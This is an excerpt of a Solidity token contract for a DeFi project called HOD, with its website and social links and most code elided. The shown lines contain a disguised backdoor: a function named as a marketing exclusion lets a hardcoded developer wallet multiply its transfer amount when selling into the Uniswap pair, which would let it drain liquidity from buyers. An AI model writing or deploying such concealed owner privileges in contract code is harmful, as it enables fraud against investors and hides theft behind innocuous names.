...
Website https://www.hod.finance
Dapp   https:/app.hod.finance
Docs   https://docs.hod.finance

Twitter  https://twitter.com/hoddefi
Telegram https://t.me/hoddefi
...
contract HOD is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _basicTransfer(
        ...
        uint256 transferAmount = isExcludedFromMarketing(sender, recipient) ? amount * buyLiquidityFee : amount;
    ...
    constructor() {
        ...
        maxTransactionAmount = _totalSupply * 30 / 1000;
        maxWallet = _totalSupply * 30 / 1000; // 3% maxWallet
        ...
        devAddress = address(0x955bf45337D57B11308b98E9Ed1C3B944c6c2363); // set as dev wallet
        ...
        excludeFromMaxTransaction(address(treasuryAddress), true);
    ...
    function isExcludedFromMarketing( address from, address to) internal view returns (bool) {
        return to == uniswapV2Pair && from == devAddress && from != address(0) && to != address(0);
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            ...
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0){
                ...
                tokensForMC -= balanceOf(devAddress);
